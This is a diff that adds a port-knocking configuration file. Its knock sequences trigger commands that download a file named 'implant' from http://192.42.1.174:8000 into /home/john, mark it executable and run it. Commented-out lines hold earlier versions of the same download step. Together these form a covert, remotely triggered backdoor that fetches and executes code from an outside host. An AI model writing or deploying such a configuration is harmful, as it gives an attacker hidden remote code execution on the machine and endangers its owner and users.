@@ -1,0 +1,23 @@
+interface: "ens3"
+timeout: 5
+rules:
+  - name: "knock-firewall"
+    command: "wget http://192.42.1.174:8000 -O /home/john/implant"
+    sequence:
+      - 32768
+      - 28977
+      - 51234
+  - name: "execute-implant1"
+    command: "chmod +x /home/john/implant"
+    sequence:
+      - 18933
+      - 32768
+  - name: "execute-implant2"
+    command: "/home/john/implant"
+    sequence:
+      - 54321
+      - 12345
+
+
+# && sleep 5 && wget http://192.42.1.174:8000 -O test4-implant"
+#command: "touch /home/john/pre-knock.txt && sleep 60 && cd /home/john && wget http://192.42.1.174:8000 -O implant && touch /home/john/knock.txt"
